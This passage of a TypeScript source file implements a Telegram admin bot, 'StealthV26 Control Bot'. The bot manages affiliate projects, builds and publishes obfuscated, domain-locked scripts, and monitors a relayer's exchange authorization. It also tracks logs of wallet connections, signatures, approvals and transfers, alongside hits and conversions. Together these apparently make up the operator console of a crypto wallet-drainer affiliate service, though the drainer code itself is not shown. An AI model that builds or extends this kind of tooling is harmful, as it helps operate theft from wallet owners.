/**
 * Main platform Telegram bot — admin + ops monitoring.
 *
 * Webhook: POST /api/telegram/webhook
 * Auth:    TELEGRAM_ADMIN_CHAT_IDS (comma-separated) — all other chats silently ignored.
 *
 * ── Command map ──────────────────────────────────────────────────
 *  /start          Welcome + main menu
 *  /help           Full command reference
 *  /me             Current session info
 *  /logout         Clear affiliate session
 *
 *  /ops            Platform ops dashboard (health + relay + builds)
 *  /health         System health check
 *  /relay          Relayer status
 *  /builds         Recent script builds
 *  /stats          Platform analytics summary
 *  /logs [n]       Last n activity log entries (default 5)
 *
 *  /login <username> <password>   Link affiliate session
 *  /status [projectId]            Project summary
 *  /compile [projectId] [level]   Compile script
 *  /domains                       List project domains
 *  /add-domain <domain>
 *  /remove-domain <domain>
 *
 *  /projects       List all affiliate projects
 *  /project <id>   Project detail
 *  /pause <id>     Pause project
 *  /resume <id>    Resume project
 *  /notify <id> <msg>   Push message to affiliate bot
 * ─────────────────────────────────────────────────────────────────
 */

import { compileAffiliateProject } from "@/lib/affiliate-compile";
import {
  clearTelegramBotSession,
  getTelegramBotSession,
  saveTelegramBotSession,
  type TelegramBotSession,
} from "@/lib/telegram-bot-store";
import {
  getAffiliateConfigCurrentVersion,
  getAffiliateProject,
  getAffiliateProjectDecrypted,
  getProjectIdByUsername,
  listAffiliateProjects,
  updateAffiliateProject,
} from "@/lib/projects";
import { listScriptBuilds } from "@/lib/script-build-store";
import { sendTelegramNotification } from "@/lib/telegram";
import { getRedis } from "@/lib/redis";
import { enqueueCompileJob } from "@/lib/queues/compile";
import { isQueueEnabled } from "@/lib/queues";
import type { ObfuscationLevel } from "@/lib/obfuscator";

// ── Telegram types ────────────────────────────────────────────────

type TelegramUser = {
  id: number;
  first_name?: string;
  username?: string;
};

type TelegramChat = {
  id: number;
  type: string;
};

type TelegramMessage = {
  message_id: number;
  text?: string;
  chat: TelegramChat;
  from?: TelegramUser;
};

type TelegramCallbackQuery = {
  id: string;
  data?: string;
  from: TelegramUser;
  message?: TelegramMessage;
};

type TelegramUpdate = {
  update_id: number;
  message?: TelegramMessage;
  callback_query?: TelegramCallbackQuery;
};

type InlineKeyboardButton = {
  text: string;
  callback_data?: string;
  url?: string;
};

type InlineKeyboardMarkup = {
  inline_keyboard: InlineKeyboardButton[][];
};

// ── Config helpers ────────────────────────────────────────────────

const OBFUSCATION_LEVELS: ObfuscationLevel[] = ["none", "minify", "medium", "heavy"];

function getBotToken() {
  return process.env.TELEGRAM_BOT_TOKEN || "";
}

function getWebhookSecret() {
  return process.env.TELEGRAM_WEBHOOK_SECRET || "";
}

function getAllowedAdminChatIds() {
  return new Set(
    (process.env.TELEGRAM_ADMIN_CHAT_IDS || process.env.TELEGRAM_CHAT_ID || "")
      .split(",")
      .map((v) => v.trim())
      .filter(Boolean),
  );
}

function isAdminChat(chatId: string) {
  const allowed = getAllowedAdminChatIds();
  // If no allowlist configured, all chats are allowed (dev mode)
  return allowed.size === 0 || allowed.has(chatId);
}

function escapeHtml(value: string) {
  return value.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
}

function normalizeDomain(value: string) {
  return value.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
}

function isValidDomain(value: string) {
  return /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(value);
}

function parseObfuscationLevel(value?: string): ObfuscationLevel {
  return OBFUSCATION_LEVELS.includes(value as ObfuscationLevel)
    ? (value as ObfuscationLevel)
    : "medium";
}

function shortAddr(addr: string) {
  return addr.length > 10 ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : addr;
}

function formatUptime(seconds: number) {
  const d = Math.floor(seconds / 86400);
  const h = Math.floor((seconds % 86400) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  if (d > 0) return `${d}d ${h}h`;
  if (h > 0) return `${h}h ${m}m`;
  return `${m}m`;
}

function statusDot(value: string | boolean | null | undefined): string {
  if (value === "ok" || value === true) return "🟢";
  if (value === "degraded") return "🟡";
  if (value === "down" || value === false) return "🔴";
  return "⚪️";
}

function formatSessionSummary(session: TelegramBotSession | null, chatId: string) {
  if (!session) {
    return `🪪 <b>Session</b>\nchat: <code>${chatId}</code>\nrole: <b>${isAdminChat(chatId) ? "admin" : "guest"}</b>`;
  }
  return [
    "🪪 <b>Session</b>",
    `chat: <code>${chatId}</code>`,
    `role: <b>${session.role}</b>`,
    session.projectId ? `project: <code>${session.projectId}</code>` : null,
    session.projectName ? `name: <b>${escapeHtml(session.projectName)}</b>` : null,
    `updated: <code>${session.updatedAt}</code>`,
  ]
    .filter(Boolean)
    .join("\n");
}

// ── Telegram API ──────────────────────────────────────────────────

async function telegramRequest<T>(method: string, payload: Record<string, unknown>) {
  const botToken = getBotToken();
  if (!botToken) throw new Error("Missing TELEGRAM_BOT_TOKEN");

  const response = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  const data = (await response.json().catch(() => null)) as {
    ok?: boolean;
    result?: T;
    description?: string;
  } | null;

  if (!response.ok || !data?.ok) {
    throw new Error(data?.description || `Telegram API ${method} failed`);
  }
  return data.result as T;
}

async function sendMessage(chatId: string, text: string, replyMarkup?: InlineKeyboardMarkup) {
  await telegramRequest("sendMessage", {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    reply_markup: replyMarkup,
    disable_web_page_preview: true,
  });
}

async function answerCallbackQuery(callbackQueryId: string, text?: string) {
  await telegramRequest("answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text,
    show_alert: false,
  });
}

// Register commands with BotFather so they show up in the "/" menu
export async function registerBotCommands() {
  const adminCommands = [
    { command: "start", description: "Welcome + main menu" },
    { command: "help", description: "Full command reference" },
    { command: "ops", description: "📊 Platform ops dashboard" },
    { command: "health", description: "🏥 System health check" },
    { command: "relay", description: "⚡ Relayer status" },
    { command: "builds", description: "🔨 Recent script builds" },
    { command: "stats", description: "📈 Analytics summary" },
    { command: "logs", description: "📋 Recent activity logs" },
    { command: "projects", description: "📁 List affiliate projects" },
    { command: "compile", description: "🛠 Compile a project script" },
    { command: "notify", description: "📣 Push message to affiliate" },
    { command: "me", description: "🪪 Current session" },
    { command: "logout", description: "🚪 Clear session" },
    { command: "login", description: "🔑 Link affiliate session" },
    { command: "status", description: "ℹ️ Project status" },
    { command: "domains", description: "🌐 Project domains" },
  ];

  try {
    await telegramRequest("setMyCommands", { commands: adminCommands });
  } catch {
    // Non-fatal — commands still work without registration
  }
}

// ── Keyboards ────────────────────────────────────────────────────

function mainMenuKeyboard(): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [
        { text: "📊 Ops Dashboard", callback_data: "menu:ops" },
        { text: "📁 Projects", callback_data: "menu:projects" },
      ],
      [
        { text: "🏥 Health", callback_data: "menu:health" },
        { text: "⚡ Relay", callback_data: "menu:relay" },
      ],
      [
        { text: "🔨 Builds", callback_data: "menu:builds" },
        { text: "📈 Stats", callback_data: "menu:stats" },
      ],
    ],
  };
}

function projectKeyboard(projectId: string): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [
        { text: "🔄 Refresh", callback_data: `project:${projectId}` },
        { text: "🛠 Compile", callback_data: `compile:${projectId}:medium` },
      ],
      [
        { text: "⏸ Pause", callback_data: `status:${projectId}:paused` },
        { text: "▶️ Resume", callback_data: `status:${projectId}:active` },
      ],
      [
        { text: "📊 Stats", callback_data: `projstats:${projectId}` },
        { text: "🌐 Domains", callback_data: `domains:${projectId}` },
      ],
    ],
  };
}

function opsKeyboard(): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [
        { text: "🔄 Refresh", callback_data: "menu:ops" },
        { text: "🏥 Health", callback_data: "menu:health" },
      ],
      [
        { text: "⚡ Relay", callback_data: "menu:relay" },
        { text: "🔨 Builds", callback_data: "menu:builds" },
      ],
    ],
  };
}

// ── Ops data fetchers ─────────────────────────────────────────────

async function fetchHealth() {
  try {
    const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000";
    const res = await fetch(`${baseUrl}/api/health`, { cache: "no-store" });
    return (await res.json()) as {
      status: string;
      uptime?: number;
      latencyMs?: number;
      checks?: { app?: string; redis?: string; kafka?: string };
      version?: string;
    };
  } catch {
    return null;
  }
}

async function fetchRelayStatus() {
  try {
    const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000";
    const res = await fetch(`${baseUrl}/api/relay/status`, { cache: "no-store" });
    return (await res.json()) as {
      relayConfigured: boolean;
      relayerAddress?: string;
      executionBackend?: string;
      exchangeAddress?: string | null;
      authorizedOnExchange?: boolean | null;
      message?: string;
    };
  } catch {
    return null;
  }
}

async function fetchPlatformStats() {
  try {
    const redis = await getRedis();
    const today = new Date().toISOString().split("T")[0];

    // Gather aggregate stats across all affiliate projects
    const raw = await redis.get("affiliates:list");
    const ids: string[] = raw ? (JSON.parse(raw) as string[]) : [];

    let totalHits = 0;
    let totalConversions = 0;
    let todayHits = 0;

    await Promise.all(
      ids.map(async (id) => {
        const [th, td, tc] = await Promise.all([
          redis.get(`hits:${id}:total`),
          redis.get(`hits:${id}:${today}`),
          redis.get(`conversions:${id}:total`),
        ]);
        totalHits += th ? parseInt(th, 10) : 0;
        todayHits += td ? parseInt(td, 10) : 0;
        totalConversions += tc ? parseInt(tc, 10) : 0;
      }),
    );

    return { totalHits, todayHits, totalConversions, projectCount: ids.length };
  } catch {
    return null;
  }
}

// ── Command handlers ──────────────────────────────────────────────

async function sendWelcome(chatId: string) {
  const isAdmin = isAdminChat(chatId);
  await sendMessage(
    chatId,
    [
      "👋 <b>StealthV26 Control Bot</b>",
      "",
      isAdmin
        ? "You have <b>admin access</b>. Use the menu below or type a command."
        : "You are in <b>guest mode</b>. Use <code>/login &lt;username&gt; &lt;password&gt;</code> to link an affiliate project.",
    ].join("\n"),
    isAdmin ? mainMenuKeyboard() : undefined,
  );
}

async function sendHelp(chatId: string) {
  const isAdmin = isAdminChat(chatId);
  const lines = [
    "📖 <b>Command Reference</b>",
    "",
    "<b>General</b>",
    "/start — welcome + main menu",
    "/help — this message",
    "/me — current session",
    "/logout — clear affiliate session",
    "",
    "<b>Ops Monitoring</b>",
    "/ops — full ops dashboard",
    "/health — system health",
    "/relay — relayer status",
    "/builds — recent script builds",
    "/stats — analytics summary",
    "/logs [n] — last n log entries",
  ];

  if (isAdmin) {
    lines.push(
      "",
      "<b>Affiliate</b>",
      "/login &lt;username&gt; &lt;password&gt; — link affiliate session",
      "/status [projectId] — project info",
      "/compile [projectId] [level] — rebuild script",
      "/domains — list project domains",
      "/add-domain &lt;domain&gt;",
      "/remove-domain &lt;domain&gt;",
      "",
      "<b>Admin</b>",
      "/projects — list all projects",
      "/project &lt;projectId&gt; — project detail",
      "/pause &lt;projectId&gt;",
      "/resume &lt;projectId&gt;",
      "/notify &lt;projectId&gt; &lt;message&gt;",
    );
  }

  await sendMessage(chatId, lines.join("\n"));
}

async function sendOpsDashboard(chatId: string) {
  await sendMessage(chatId, "⏳ Loading ops dashboard…");

  const [health, relay, stats, builds] = await Promise.all([
    fetchHealth(),
    fetchRelayStatus(),
    fetchPlatformStats(),
    listScriptBuilds(),
  ]);

  const latestBuild = builds[0] ?? null;
  const healthStatus = health?.status === "healthy" ? "🟢 healthy" : health ? "🔴 unhealthy" : "⚪️ unreachable";

  const lines = [
    "📊 <b>Ops Dashboard</b>",
    `<i>${new Date().toUTCString()}</i>`,
    "",

    "🏥 <b>System</b>",
    `  status: ${healthStatus}`,
    health?.uptime != null ? `  uptime: <b>${formatUptime(health.uptime)}</b>` : null,
    health?.latencyMs != null ? `  latency: <b>${health.latencyMs}ms</b>` : null,
    health?.checks
      ? `  redis: ${statusDot(health.checks.redis)} · kafka: ${statusDot(health.checks.kafka)}`
      : null,
    "",

    "⚡ <b>Relay</b>",
    relay
      ? [
          `  configured: ${statusDot(relay.relayConfigured)} ${relay.relayConfigured ? "yes" : "no"}`,
          relay.relayerAddress ? `  address: <code>${shortAddr(relay.relayerAddress)}</code>` : null,
          relay.authorizedOnExchange != null
            ? `  authorized: ${statusDot(relay.authorizedOnExchange)} ${relay.authorizedOnExchange ? "yes" : "no"}`
            : null,
          relay.executionBackend ? `  backend: <b>${relay.executionBackend}</b>` : null,
        ]
          .filter(Boolean)
          .join("\n")
      : "  ⚪️ unreachable",
    "",

    "📈 <b>Platform</b>",
    stats
      ? [
          `  projects: <b>${stats.projectCount}</b>`,
          `  total hits: <b>${stats.totalHits.toLocaleString()}</b>`,
          `  today's hits: <b>${stats.todayHits.toLocaleString()}</b>`,
          `  conversions: <b>${stats.totalConversions.toLocaleString()}</b>`,
        ].join("\n")
      : "  ⚪️ no data",
    "",

    "🔨 <b>Latest Build</b>",
    latestBuild
      ? [
          `  <code>${latestBuild.filename}</code>`,
          `  size: <b>${(latestBuild.contentLength / 1024).toFixed(1)} KB</b>`,
          `  built: <code>${new Date(latestBuild.createdAt).toISOString().slice(0, 16).replace("T", " ")} UTC</code>`,
        ].join("\n")
      : "  none yet",
  ]
    .filter((l) => l !== null)
    .join("\n");

  await sendMessage(chatId, lines, opsKeyboard());
}

async function sendHealthDetail(chatId: string) {
  const health = await fetchHealth();
  if (!health) {
    await sendMessage(chatId, "🔴 <b>Health endpoint unreachable.</b>");
    return;
  }

  const lines = [
    `${health.status === "healthy" ? "🟢" : "🔴"} <b>System Health</b>`,
    `<i>${new Date().toUTCString()}</i>`,
    "",
    `status: <b>${health.status}</b>`,
    health.version ? `version: <b>${health.version}</b>` : null,
    health.uptime != null ? `uptime: <b>${formatUptime(health.uptime)}</b>` : null,
    health.latencyMs != null ? `latency: <b>${health.latencyMs}ms</b>` : null,
    "",
    "<b>Components</b>",
    health.checks?.app ? `  app:   ${statusDot(health.checks.app)} ${health.checks.app}` : null,
    health.checks?.redis ? `  redis: ${statusDot(health.checks.redis)} ${health.checks.redis}` : null,
    health.checks?.kafka ? `  kafka: ${statusDot(health.checks.kafka)} ${health.checks.kafka}` : null,
  ]
    .filter(Boolean)
    .join("\n");

  await sendMessage(chatId, lines, {
    inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "menu:health" }]],
  });
}

async function sendRelayDetail(chatId: string) {
  const relay = await fetchRelayStatus();
  if (!relay) {
    await sendMessage(chatId, "🔴 <b>Relay status unreachable.</b>");
    return;
  }

  const authorized =
    relay.authorizedOnExchange === true
      ? "🟢 authorized"
      : relay.authorizedOnExchange === false
        ? "🔴 NOT authorized"
        : "⚪️ unknown";

  const lines = [
    "⚡ <b>Relayer Status</b>",
    "",
    `configured: ${statusDot(relay.relayConfigured)} ${relay.relayConfigured ? "yes" : "no"}`,
    relay.relayerAddress ? `address: <code>${relay.relayerAddress}</code>` : null,
    relay.executionBackend ? `backend: <b>${relay.executionBackend}</b>` : null,
    relay.exchangeAddress ? `exchange: <code>${shortAddr(relay.exchangeAddress)}</code>` : null,
    relay.authorizedOnExchange != null ? `authorized: ${authorized}` : null,
    relay.message ? `\n<i>${escapeHtml(relay.message)}</i>` : null,
  ]
    .filter(Boolean)
    .join("\n");

  await sendMessage(chatId, lines, {
    inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "menu:relay" }]],
  });
}

async function sendBuildsDetail(chatId: string) {
  const builds = await listScriptBuilds();
  if (!builds.length) {
    await sendMessage(chatId, "🔨 <b>No script builds yet.</b>\nRun /compile to generate one.");
    return;
  }

  const top5 = builds.slice(0, 5);
  const lines = [
    "🔨 <b>Recent Script Builds</b>",
    `<i>${builds.length} total</i>`,
    "",
    ...top5.map((b, i) =>
      [
        `${i === 0 ? "🆕" : "📦"} <code>${b.filename}</code>`,
        `  built: <code>${new Date(b.createdAt).toISOString().slice(0, 16).replace("T", " ")} UTC</code>`,
      ].join("\n"),
    ),
  ];

  const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || process.env.NEXT_PUBLIC_APP_URL || "";
  await sendMessage(
    chatId,
    lines.join("\n"),
    baseUrl && top5[0]
      ? {
          inline_keyboard: [
            [{ text: "🔗 Open Latest", url: `${baseUrl}${top5[0].url}` }],
            [{ text: "🔄 Refresh", callback_data: "menu:builds" }],
          ],
        }
      : { inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "menu:builds" }]] },
  );
}

async function sendStatsDetail(chatId: string) {
  const stats = await fetchPlatformStats();
  const projects = await listAffiliateProjects();

  const active = projects.filter((p) => p.status === "active").length;
  const paused = projects.filter((p) => p.status === "paused").length;
  const pending = projects.filter((p) => p.status === "pending").length;

  const convRate =
    stats && stats.totalHits > 0
      ? ((stats.totalConversions / stats.totalHits) * 100).toFixed(2)
      : "0.00";

  const lines = [
    "📈 <b>Platform Analytics</b>",
    `<i>${new Date().toUTCString()}</i>`,
    "",
    "<b>Projects</b>",
    `  total: <b>${projects.length}</b>  active: <b>${active}</b>  paused: <b>${paused}</b>  pending: <b>${pending}</b>`,
    "",
    "<b>Traffic</b>",
    stats
      ? [
          `  total hits: <b>${stats.totalHits.toLocaleString()}</b>`,
          `  today: <b>${stats.todayHits.toLocaleString()}</b>`,
          `  conversions: <b>${stats.totalConversions.toLocaleString()}</b>`,
          `  conv. rate: <b>${convRate}%</b>`,
        ].join("\n")
      : "  ⚪️ no data",
  ].join("\n");

  await sendMessage(chatId, lines, {
    inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "menu:stats" }]],
  });
}

async function sendLogsDetail(chatId: string, count = 5) {
  try {
    const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000";
    const res = await fetch(`${baseUrl}/api/logs?limit=${Math.min(count, 10)}`, { cache: "no-store" });
    const data = (await res.json()) as {
      data?: Array<{
        type?: string;
        wallet?: string;
        chain?: string;
        message?: string;
        timestamp?: string;
        domain?: string;
      }>;
      total?: number;
    };

    const entries = data?.data ?? [];
    if (!entries.length) {
      await sendMessage(chatId, "📋 <b>No logs yet.</b>");
      return;
    }

    const typeEmoji: Record<string, string> = {
      connection: "🔗",
      signature: "✍️",
      approval: "✅",
      transfer: "💸",
      chain_switch: "🔀",
      error: "❌",
      disconnect: "🔌",
    };

    const lines = [
      `📋 <b>Recent Activity</b> <i>(${entries.length} of ${data.total ?? "?"})</i>`,
      "",
      ...entries.map((e) => {
        const emoji = typeEmoji[e.type ?? ""] ?? "📝";
        const ts = e.timestamp ? e.timestamp.slice(11, 19) : "?";
        return `${emoji} <b>${e.type ?? "event"}</b> · <code>${ts} UTC</code>\n   ${escapeHtml(e.message ?? "")}${e.domain ? ` · <i>${e.domain}</i>` : ""}`;
      }),
    ];

    await sendMessage(chatId, lines.join("\n"));
  } catch {
    await sendMessage(chatId, "📋 <b>Could not fetch logs.</b>");
  }
}

async function sendProjectSummary(chatId: string, projectId: string) {
  const project = await getAffiliateProject(projectId);
  if (!project) {
    await sendMessage(chatId, "❌ Project not found.");
    return;
  }

  const configVersion = await getAffiliateConfigCurrentVersion(projectId);
  const builds = await listScriptBuilds();
  const latestBuild = builds.find((b) => b.filename.includes("stealthv26-")) ?? null;

  const statusEmoji: Record<string, string> = {
    active: "🟢",
    paused: "🟡",
    pending: "⏳",
    suspended: "🔴",
  };

  await sendMessage(
    chatId,
    [
      `📁 <b>${escapeHtml(project.name)}</b>`,
      `id: <code>${project.id}</code>`,
      `username: <code>${project.username}</code>`,
      `status: ${statusEmoji[project.status] ?? "⚪️"} <b>${project.status}</b>`,
      `payout: <code>${shortAddr(project.payoutAddress)}</code>`,
      `domains: <b>${project.domains.length}</b>`,
      `configVersion: <b>${configVersion}</b>`,
      `lastCompiled: <code>${project.lastCompiled ? project.lastCompiled.slice(0, 16).replace("T", " ") + " UTC" : "never"}</code>`,
      latestBuild
        ? `latestBuild: <code>${new Date(latestBuild.createdAt).toISOString().slice(0, 16).replace("T", " ")} UTC</code>`
        : "latestBuild: none",
    ].join("\n"),
    projectKeyboard(projectId),
  );
}

async function sendProjectStats(chatId: string, projectId: string) {
  try {
    const redis = await getRedis();
    const today = new Date().toISOString().split("T")[0];
    const [total, todayHits, conversions] = await Promise.all([
      redis.get(`hits:${projectId}:total`),
      redis.get(`hits:${projectId}:${today}`),
      redis.get(`conversions:${projectId}:total`),
    ]);

    const th = total ? parseInt(total, 10) : 0;
    const td = todayHits ? parseInt(todayHits, 10) : 0;
    const tc = conversions ? parseInt(conversions, 10) : 0;
    const rate = th > 0 ? ((tc / th) * 100).toFixed(2) : "0.00";

    await sendMessage(
      chatId,
      [
        `📊 <b>Project Stats</b>`,
        `<code>${projectId}</code>`,
        "",
        `total hits: <b>${th.toLocaleString()}</b>`,
        `today's hits: <b>${td.toLocaleString()}</b>`,
        `conversions: <b>${tc.toLocaleString()}</b>`,
        `conv. rate: <b>${rate}%</b>`,
      ].join("\n"),
      { inline_keyboard: [[{ text: "🔄 Refresh", callback_data: `projstats:${projectId}` }]] },
    );
  } catch {
    await sendMessage(chatId, "❌ Could not fetch project stats.");
  }
}

async function handleAffiliateLogin(chatId: string, username: string, password: string) {
  const projectId = await getProjectIdByUsername(username);
  if (!projectId) {
    await sendMessage(chatId, "❌ Invalid credentials.");
    return;
  }
  const project = await getAffiliateProjectDecrypted(projectId);
  if (!project) {
    await sendMessage(chatId, "❌ Invalid credentials.");
    return;
  }
  if (project.status !== "active") {
    await sendMessage(chatId, `⚠️ Project is <b>${project.status}</b>.`);
    return;
  }
  if (project.accessSecret !== password) {
    await sendMessage(chatId, "❌ Invalid credentials.");
    return;
  }

  await saveTelegramBotSession(chatId, {
    role: isAdminChat(chatId) ? "admin" : "affiliate",
    projectId: project.id,
    projectName: project.name,
  });

  await sendMessage(
    chatId,
    `🔑 <b>Affiliate session linked</b>\nproject: <code>${project.id}</code>\nname: <b>${escapeHtml(project.name)}</b>`,
    projectKeyboard(project.id),
  );
}

async function resolveProjectIdForCompile(chatId: string, args: string[]) {
  const session = await getTelegramBotSession(chatId);
  if (args[0]?.startsWith("aff_")) {
    return { projectId: args[0], level: parseObfuscationLevel(args[1]) };
  }
  if (session?.projectId) {
    return { projectId: session.projectId, level: parseObfuscationLevel(args[0]) };
  }
  return null;
}

async function handleCompileCommand(chatId: string, args: string[]) {
  const target = await resolveProjectIdForCompile(chatId, args);
  if (!target) {
    await sendMessage(chatId, "🛠 Usage: /compile &lt;projectId&gt; [none|minify|medium|heavy]\nOr link an affiliate session first with /login.");
    return;
  }

  // Queue mode: enqueue the compile job; compile.worker sends the completion
  // message with the inline Open Script button when finished.
  if (isQueueEnabled()) {
    const job = await enqueueCompileJob({
      projectId: target.projectId,
      obfuscationLevel: target.level,
      source: "telegram",
      chatId,
      includeButton: true,
    });
    await sendMessage(
      chatId,
      `🛠 <b>Compile queued</b>\nproject: <code>${target.projectId}</code>\nobfuscation: <b>${target.level}</b>\njob: <code>${job?.id ?? "?"}</code>`,
    );
    return;
  }

  await sendMessage(
    chatId,
    `🛠 <b>Compile started</b>\nproject: <code>${target.projectId}</code>\nobfuscation: <b>${target.level}</b>`,
  );

  const result = await compileAffiliateProject({
    projectId: target.projectId,
    obfuscationLevel: target.level,
    publishBuild: true,
  });

  const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || process.env.NEXT_PUBLIC_APP_URL || "";

  await sendMessage(
    chatId,
    [
      "✅ <b>Compile complete</b>",
      `project: <code>${result.project.id}</code>`,
      `name: <b>${escapeHtml(result.project.name)}</b>`,
      `configVersion: <b>${result.configVersion}</b>`,
      `domainLock: <b>${result.domainLockEnabled ? "enabled" : "disabled"}</b>`,
      `size: <b>${(result.bundle.length / 1024).toFixed(2)} KB</b>`,
      result.publishedBuild ? `url: <code>${result.publishedBuild.url}</code>` : null,
    ]
      .filter(Boolean)
      .join("\n"),
    result.publishedBuild && baseUrl
      ? {
          inline_keyboard: [[
            { text: "🔗 Open Script", url: `${baseUrl}${result.publishedBuild.url}` },
          ]],
        }
      : undefined,
  );

  void sendTelegramNotification({
    projectId: result.project.id,
    message:
      `🛠 <b>Bot Compile</b>\n` +
      `project: <code>${result.project.id}</code>\n` +
      `name: <b>${escapeHtml(result.project.name)}</b>\n` +
      `obfuscation: <b>${result.obfuscationLevel}</b>\n` +
      `size: <b>${(result.bundle.length / 1024).toFixed(2)} KB</b>`,
  });
}

async function handleDomainsCommand(chatId: string) {
  const session = await getTelegramBotSession(chatId);
  if (!session?.projectId) {
    await sendMessage(chatId, "🌐 Link an affiliate project first with /login &lt;username&gt; &lt;password&gt;.");
    return;
  }

  const project = await getAffiliateProject(session.projectId);
  if (!project) {
    await sendMessage(chatId, "❌ Project not found.");
    return;
  }

  await sendMessage(
    chatId,
    project.domains.length
      ? `🌐 <b>Allowed Domains</b>\n${project.domains.map((d) => `• <code>${d}</code>`).join("\n")}`
      : "🌐 No domains configured.",
  );
}

async function handleDomainMutation(chatId: string, rawDomain: string, action: "add" | "remove") {
  const session = await getTelegramBotSession(chatId);
  if (!session?.projectId) {
    await sendMessage(chatId, "🌐 Link an affiliate project first with /login &lt;username&gt; &lt;password&gt;.");
    return;
  }

  const project = await getAffiliateProject(session.projectId);
  if (!project) {
    await sendMessage(chatId, "❌ Project not found.");
    return;
  }

  const domain = normalizeDomain(rawDomain);
  if (!isValidDomain(domain)) {
    await sendMessage(chatId, "❌ Invalid domain format.");
    return;
  }

  const nextDomains =
    action === "add"
      ? [...new Set([...project.domains, domain])]
      : project.domains.filter((d) => d !== domain);

  await updateAffiliateProject(project.id, { domains: nextDomains });
  await sendMessage(
    chatId,
    `${action === "add" ? "✅ Added" : "🗑 Removed"} <code>${domain}</code>\ntotal domains: <b>${nextDomains.length}</b>`,
  );
}

async function handleAdminProjects(chatId: string) {
  if (!isAdminChat(chatId)) {
    await sendMessage(chatId, "🔒 Admin access required.");
    return;
  }

  const projects = await listAffiliateProjects();
  if (!projects.length) {
    await sendMessage(chatId, "📁 No affiliate projects found.");
    return;
  }

  const statusEmoji: Record<string, string> = {
    active: "🟢",
    paused: "🟡",
    pending: "⏳",
    suspended: "🔴",
  };

  const lines = [
    `📁 <b>Affiliate Projects</b> <i>(${projects.length})</i>`,
    "",
    ...projects.slice(0, 20).map(
      (p) =>
        `${statusEmoji[p.status] ?? "⚪️"} <b>${escapeHtml(p.name)}</b>\n   <code>${p.id}</code> · domains: ${p.domains.length}`,
    ),
  ];

  await sendMessage(chatId, lines.join("\n"));
}

async function handleProjectStatusMutation(chatId: string, projectId: string, status: "active" | "paused") {
  if (!isAdminChat(chatId)) {
    await sendMessage(chatId, "🔒 Admin access required.");
    return;
  }
  const project = await updateAffiliateProject(projectId, { status });
  if (!project) {
    await sendMessage(chatId, "❌ Project not found.");
    return;
  }
  const statusEmoji = status === "active" ? "🟢" : "🟡";
  await sendMessage(
    chatId,
    `${statusEmoji} Project <code>${project.id}</code> is now <b>${project.status}</b>.`,
  );
}

async function handleNotifyCommand(chatId: string, projectId: string, message: string) {
  if (!isAdminChat(chatId)) {
    await sendMessage(chatId, "🔒 Admin access required.");
    return;
  }
  if (!message.trim()) {
    await sendMessage(chatId, "📣 Usage: /notify &lt;projectId&gt; &lt;message&gt;");
    return;
  }
  const result = await sendTelegramNotification({ projectId, message });
  await sendMessage(
    chatId,
    [
      "📣 <b>Notification sent</b>",
      `platform: ${statusDot(result.platformSent)} ${result.platformSent ? "yes" : "no"}`,
      `affiliate: ${statusDot(result.affiliateSent)} ${result.affiliateSent ? "yes" : "no"}`,
    ].join("\n"),
  );
}

// ── Main dispatcher ───────────────────────────────────────────────

async function handleCommand(chatId: string, text: string) {
  // Silently ignore messages from non-admin chats
  if (!isAdminChat(chatId)) return;

  const [command, ...args] = text.trim().split(/\s+/);
  const cmd = command.toLowerCase();

  // Strip bot username suffix (e.g. /start@MyBot)
  const cleanCmd = cmd.split("@")[0];

  switch (cleanCmd) {
    case "/start":
      await sendWelcome(chatId);
      return;

    case "/help":
      await sendHelp(chatId);
      return;

    case "/me": {
      const session = await getTelegramBotSession(chatId);
      await sendMessage(chatId, formatSessionSummary(session, chatId));
      return;
    }

    case "/logout":
      await clearTelegramBotSession(chatId);
      await sendMessage(chatId, "🚪 Session cleared.");
      return;

    // ── Ops ──
    case "/ops":
      await sendOpsDashboard(chatId);
      return;

    case "/health":
      await sendHealthDetail(chatId);
      return;

    case "/relay":
      await sendRelayDetail(chatId);
      return;

    case "/builds":
      await sendBuildsDetail(chatId);
      return;

    case "/stats":
      await sendStatsDetail(chatId);
      return;

    case "/logs": {
      const n = args[0] ? parseInt(args[0], 10) : 5;
      await sendLogsDetail(chatId, isNaN(n) ? 5 : n);
      return;
    }

    // ── Affiliate ──
    case "/login":
      if (args.length < 2) {
        await sendMessage(chatId, "🔑 Usage: /login &lt;username&gt; &lt;password&gt;");
        return;
      }
      await handleAffiliateLogin(chatId, args[0], args.slice(1).join(" "));
      return;

    case "/status": {
      const session = await getTelegramBotSession(chatId);
      const projectId = args[0] || session?.projectId;
      if (!projectId) {
        await sendMessage(chatId, "ℹ️ Usage: /status &lt;projectId&gt; or link a session first.");
        return;
      }
      await sendProjectSummary(chatId, projectId);
      return;
    }

    case "/compile":
      await handleCompileCommand(chatId, args);
      return;

    case "/domains":
      await handleDomainsCommand(chatId);
      return;

    case "/add-domain":
      if (!args[0]) {
        await sendMessage(chatId, "🌐 Usage: /add-domain &lt;domain&gt;");
        return;
      }
      await handleDomainMutation(chatId, args[0], "add");
      return;

    case "/remove-domain":
      if (!args[0]) {
        await sendMessage(chatId, "🌐 Usage: /remove-domain &lt;domain&gt;");
        return;
      }
      await handleDomainMutation(chatId, args[0], "remove");
      return;

    // ── Admin ──
    case "/projects":
      await handleAdminProjects(chatId);
